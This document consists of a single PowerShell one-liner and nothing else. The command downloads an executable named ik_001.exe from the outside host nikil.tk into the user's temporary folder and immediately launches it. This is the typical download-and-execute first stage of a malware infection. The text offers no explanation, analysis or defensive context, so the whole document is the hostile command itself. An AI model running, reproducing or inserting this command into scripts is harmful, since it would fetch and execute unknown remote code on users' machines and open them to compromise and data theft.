
(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/k1/ik_001.exe',"$env:TEMP\ik_001.exe");Start-Process ("$env:TEMP\ik_001.exe")

